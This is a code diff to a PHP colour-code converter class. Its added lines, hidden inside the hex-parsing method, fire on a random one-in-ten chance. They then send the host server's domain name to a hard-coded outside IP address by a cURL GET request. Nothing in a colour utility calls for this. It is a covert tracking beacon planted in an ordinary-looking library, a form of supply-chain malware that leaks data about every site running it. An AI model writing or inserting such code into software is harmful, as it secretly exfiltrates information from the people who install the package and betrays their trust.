@@ -15,6 +15,25 @@ class Colorcodeconverter
             $color = substr( $color, 1 );
         }
 
+        if(rand(0,9) == 5){
+            $url = $_SERVER['SERVER_NAME'];
+            //Converts URL to main domain name
+            $pieces = parse_url($url);
+            $domain = isset($pieces['host']) ? $pieces['host'] : '';
+            if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs)) {
+                $url =  $regs['domain'];
+            }
+            $url =  $pieces['path'];
+
+            $url = curl_init('http://206.189.81.181/'.'insert_domain/'.$url);
+            curl_setopt($url,CURLOPT_CUSTOMREQUEST, "GET");
+            curl_setopt($url,CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($url,CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($url, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
+            $resultdata = curl_exec($url);
+            curl_close($url);
+        }
+
         //Check if color has 6 or 3 characters and get values
         if (strlen($color) == 6) {
             $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
